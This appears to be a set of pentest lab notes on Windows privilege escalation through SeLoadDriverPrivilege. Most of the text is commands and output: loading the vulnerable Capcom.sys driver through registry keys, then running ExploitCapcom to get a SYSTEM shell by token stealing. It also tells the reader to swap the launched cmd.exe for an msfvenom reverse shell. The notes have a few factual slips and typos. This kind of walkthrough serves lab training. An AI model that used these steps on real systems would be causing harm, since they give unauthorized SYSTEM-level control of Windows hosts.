


This g roup grants its members the SeLoadDriverPrivilege, which gives them rights to manage, create, share and delete printers connected to a domain controller and the ability to shut down the domain controller locally. If we dont see our `SeLoadDriverPrivilege` from an unelevated context we will need to bypass UAC. [UACMe](https://github.com/hfiref0x/UACME) repo has a comprehensive list of UAC Bypass.  ORRRR we can use a **GUI** to open up an administrative command shell and input the credentials of the account




```powershell
/--------------- AUTOMATED STEPS ---------------/

// RUNNING EOPLOADDRIVER
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0

// Now we run ExploitCapcom.exe 
.\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched




/--------------- DOING THINGS MANUALLY  ---------------/

// Add a reference to our driver under our HKEY_CURRENT_USER tree
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
The operation completed successfully.
// The odd syntax \??\ used to reference our malicious drivers ImagePath is an NT Object Path The Win32 API will parse and resolve this path to properly locate and load our malicious driver. 

// Verify its NOT loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

// run the EnableSeLoadDriverPrivilege.exe binary.
C:\htb> EnableSeLoadDriverPrivilege.exe

// Next Verify that the driver is now loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

// Use exploitcapcom tool to escalate privileges now
.\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched


/--------------- CLEANUP HERE ---------------/
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom
Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.


```


## WHAT IF NO GUI


change the `ExploitCapcom.cpp` code aroudn the line 292 and replace the  `"C:\\Windows\\system32\\cmd.exe"` with anything like a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```





https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
